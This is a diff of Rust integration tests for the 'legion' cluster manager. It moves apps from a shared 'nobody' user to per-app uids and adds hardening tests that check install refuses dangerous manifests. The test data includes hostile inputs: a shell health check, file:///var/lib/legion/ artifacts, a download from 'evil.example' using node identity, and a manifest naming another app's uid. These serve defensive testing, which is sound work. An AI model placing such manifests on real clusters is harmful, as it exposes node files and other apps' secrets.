@@ -133,7 +133,6 @@ impl Fixture {
         AppReconciler::new(
             self.svc.clone(),
             ReconcilerSettings {
-                app_user: "nobody".into(),
                 seed,
                 own_build: own,
             },
@@ -342,12 +341,9 @@ async fn an_unchanged_record_makes_no_submit_test() -> R<()> {
     );
     // The stored config is normalized (defaults filled in), so it is not
     // the render; the digest is what matches.
-    let rendered = legion::manager::apps::render_for(
-        &fx.app("autoscaler")?,
-        Some(&marker("0.1.0", "a")),
-        "nobody",
-    )
-    .map_err(|err| anyhow!(err))?;
+    let rendered =
+        legion::manager::apps::render_for(&fx.app("autoscaler")?, Some(&marker("0.1.0", "a")))
+            .map_err(|err| anyhow!(err))?;
     assert_ne!(fx.stored(AUTOSCALER)?, rendered.jobspec);
     for _ in 0..3 {
         assert_eq!(
@@ -541,9 +537,8 @@ async fn a_leader_killed_mid_reconcile_leaves_one_version_test() -> R<()> {
     let reconciler = fx.reconciler(marker("0.1.0", "a"));
     reconciler.seed()?;
     let record = fx.app("autoscaler")?;
-    let rendered =
-        legion::manager::apps::render_for(&record, Some(&marker("0.1.0", "a")), "nobody")
-            .map_err(|err| anyhow!(err))?;
+    let rendered = legion::manager::apps::render_for(&record, Some(&marker("0.1.0", "a")))
+        .map_err(|err| anyhow!(err))?;
     let key = format!("app:autoscaler:{}:none", rendered.digest);
 
     // The old leader's submit landed; it died before recording anything.
@@ -576,7 +571,6 @@ async fn a_burst_of_changes_coalesces_test() -> R<()> {
     let nudge = legion::manager::apps::spawn_reconciler(
         fx.svc.clone(),
         ReconcilerSettings {
-            app_user: "nobody".into(),
             seed: BTreeMap::new(),
             own_build: marker("0.1.0", "a"),
         },
@@ -607,9 +601,8 @@ async fn a_burst_of_changes_coalesces_test() -> R<()> {
     let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
     loop {
         let record = fx.app("autoscaler")?;
-        let rendered =
-            legion::manager::apps::render_for(&record, Some(&marker("0.1.0", "a")), "nobody")
-                .map_err(|err| anyhow!(err))?;
+        let rendered = legion::manager::apps::render_for(&record, Some(&marker("0.1.0", "a")))
+            .map_err(|err| anyhow!(err))?;
         let stamp = fx.version(AUTOSCALER)?.and_then(|v| v.managed_by);
         if stamp.as_ref().map(|stamp| stamp.digest.as_str()) == Some(rendered.digest.as_str()) {
             break;
@@ -627,14 +620,15 @@ async fn a_burst_of_changes_coalesces_test() -> R<()> {
     Ok(())
 }
 
-/// A manifest whose job installs (it parses) but that submit refuses: an
-/// exec task as root in `legion-system`.
-fn root_manifest() -> Value {
+/// A manifest whose job installs but that submit refuses: it reads a KV key
+/// its grant does not cover (install checks the job's shape, not its reads).
+fn refused_manifest() -> Value {
     json!({
         "name": "rooted",
         "version": "1.0.0",
         "job": { "task": { "name": "main", "runtime": "exec",
-                            "config": { "command": ["sleep", "1000"], "user": "root" } } },
+                            "config": { "command": ["sleep", "1000"],
+                                        "env": { "DB_PASSWORD": "$secret/db" } } } },
     })
 }
 
@@ -662,11 +656,11 @@ async fn install(
 #[tokio::test(flavor = "multi_thread")]
 async fn a_refused_submit_waits_for_a_change_test() -> R<()> {
     let fx = fixture()?;
-    install(&fx, &root_manifest(), &fx.admin).await?;
+    install(&fx, &refused_manifest(), &fx.admin).await?;
     let mut reconciler = fx.reconciler(marker("0.1.0", "a"));
     let outcome = reconciler.reconcile_app("rooted").await;
     assert!(
-        matches!(&outcome, PassOutcome::Refused(message) if message.contains("root")),
+        matches!(&outcome, PassOutcome::Refused(message) if message.contains("secret/db")),
         "{outcome:?}"
     );
     let app = fx.get_app("rooted").await?;
@@ -754,7 +748,8 @@ async fn a_third_party_app_installs_reconciles_and_uninstalls_test() -> R<()> {
     let prompt = preview.prompt.join("\n");
     assert!(
         prompt.starts_with(
-            "gitops 0.2.0 runs its own code (1 artifact) on your managers, as user nobody,"
+            "gitops 0.2.0 runs its own code (1 artifact) on your managers, as its own \
+             unprivileged user,"
         ),
         "{prompt}"
     );
@@ -810,7 +805,11 @@ async fn a_third_party_app_installs_reconciles_and_uninstalls_test() -> R<()> {
         stored["tasks"][0]["identities"][0]["permissions"],
         serde_json::to_value(&record.grant.rules)?
     );
-    assert_eq!(stored["tasks"][0]["config"]["user"], "nobody");
+    assert_eq!(
+        stored["tasks"][0]["config"]["user"],
+        json!(record.uid.to_string())
+    );
+    assert!(record.uid >= legion::structs::app::APP_UID_BASE);
     let grants = fx
         .svc
         .list_grants(req(
@@ -1262,13 +1261,146 @@ async fn app_reads_filter_by_name_test() -> R<()> {
     Ok(())
 }
 
+/// `app:write` cannot put a host-level construct in an app's job, whoever
+/// installs it (hardening after the adversarial review): an exec health
+/// check, a `file://` artifact, or `auth.nodeIdentity` would run on the
+/// managers as the worker, so install refuses each, and a code field cannot
+/// add a `file://` artifact either.
+#[tokio::test(flavor = "multi_thread")]
+async fn app_jobs_carry_no_host_level_constructs_test() -> R<()> {
+    let (fx, mut reconciler) = seeded().await?;
+    let operator = fx
+        .token(
+            "operator",
+            json!([{ "resources": ["app"], "actions": ["read", "write"] }]),
+        )
+        .await?;
+    let app = |name: &str, task: Value| json!({ "name": name, "version": "1.0.0", "job": { "task": task } });
+    let exec = |extra: Value| {
+        let mut task = json!({ "name": "main", "runtime": "exec",
+                               "config": { "command": ["sleep", "600"] } });
+        for (key, value) in extra.as_object().expect("object") {
+            task[key] = value.clone();
+        }
+        task
+    };
+    let cases = [
+        (
+            "checker",
+            json!({ "name": "main", "runtime": "container",
+                   "config": { "image": "alpine", "command": ["true"] },
+                    "checks": [{ "type": "health", "kind": "exec", "every": "10s",
+                                 "command": ["/bin/sh", "-c", "id"] }] }),
+            "exec health check",
+        ),
+        (
+            "copier",
+            exec(json!({ "artifacts": ["file:///var/lib/legion/"] })),
+            "node's own filesystem",
+        ),
+        (
+            "presenter",
+            exec(
+                json!({ "artifacts": [{ "source": "https://evil.example/x.tgz",
+                                         "auth": { "nodeIdentity": "pull" } }] }),
+            ),
+            "nodeIdentity",
+        ),
+    ];
+    for (name, task, says) in cases {
+        for token in [&operator, &fx.admin] {
+            let refused = install(&fx, &app(name, task.clone()), token)
+                .await
+                .expect_err("a host-level construct in an app's job");
+            assert_eq!(refused.code(), Code::InvalidArgument, "{name}: {refused}");
+            assert!(refused.message().contains(says), "{name}: {refused}");
+        }
+        assert!(fx.store.get_app(name)?.is_none(), "{name} was installed");
+    }
+
+    // A code field that would fetch node files, even from someone who holds
+    // the app's whole grant.
+    let mut holder_rules = editor_rules();
+    holder_rules
+        .as_array_mut()
+        .context("rules")?
+        .push(json!({ "resources": ["app"], "actions": ["read", "write"] }));
+    let holder = fx.token("holder", holder_rules).await?;
+    let refused = fx
+        .set_config(
+            "autoscaler",
+            json!({ "plugins": { "local": {
+                "source": "file:///var/lib/legion/",
+                "checksum": format!("sha256:{}", "0".repeat(64)),
+            } } }),
+            &holder,
+        )
+        .await
+        .expect_err("a file:// plugin source");
+    assert_eq!(refused.code(), Code::InvalidArgument, "{refused}");
+    assert!(
+        refused.message().contains("node's own filesystem"),
+        "{refused}"
+    );
+    assert_eq!(
+        reconciler.reconcile_app("autoscaler").await,
+        PassOutcome::Unchanged
+    );
+    Ok(())
+}
+
+/// Every app runs as its own uid (hardening after the adversarial review):
+/// two apps' exec tasks never share a user, so one cannot read the other's
+/// `secrets/`.
+#[tokio::test(flavor = "multi_thread")]
+async fn each_app_runs_as_its_own_uid_test() -> R<()> {
+    let fx = fixture()?;
+    let mut reconciler = fx.reconciler(marker("0.1.0", "a"));
+    for name in ["one", "two"] {
+        install(
+            &fx,
+            &json!({ "name": name, "version": "1.0.0",
+                     "job": { "task": { "name": "main", "runtime": "exec",
+                                        "config": { "command": ["sleep", "600"] } } } }),
+            &fx.admin,
+        )
+        .await?;
+        let outcome = reconciler.reconcile_app(name).await;
+        assert!(submitted(&outcome), "{name}: {outcome:?}");
+    }
+    let user = |name: &str| -> R<Value> {
+        Ok(fx.stored(&app_job_id(name))?["tasks"][0]["config"]["user"].clone())
+    };
+    let (one, two) = (user("one")?, user("two")?);
+    assert_ne!(one, two, "two apps share a user");
+    for (name, user) in [("one", one), ("two", two)] {
+        let uid = fx.app(name)?.uid;
+        assert!(uid >= legion::structs::app::APP_UID_BASE, "{name}: {uid}");
+        assert_eq!(user, json!(uid.to_string()), "{name}");
+    }
+    // A manifest may not pick a user: it could pick another app's.
+    let refused = install(
+        &fx,
+        &json!({ "name": "three", "version": "1.0.0",
+                 "job": { "task": { "name": "main", "runtime": "exec",
+                                    "config": { "command": ["sleep", "600"],
+                                                "user": fx.app("one")?.uid.to_string() } } } }),
+        &fx.admin,
+    )
+    .await
+    .expect_err("a manifest that names a user");
+    assert_eq!(refused.code(), Code::InvalidArgument, "{refused}");
+    assert!(refused.message().contains("config.user"), "{refused}");
+    Ok(())
+}
+
 /// Scenario A (apps plan §3 and §12 A3), with the real binary: a fresh
 /// single manager with no workers seeds the autoscaler, and `legion app
 /// list` shows it running on the manager's system worker, from the node's
 /// own binary (`legion:self`). The worker reports its build id, the app's
 /// job carries the build marker, and `job info` says the job is managed.
 ///
-/// An exec task in `legion-system` runs as `nobody`, which takes a worker
+/// An app's exec task runs as the app's own uid, which takes a worker
 /// that can switch users: run unprivileged, the test checks the placement
 /// instead of the process.
 #[cfg(unix)]
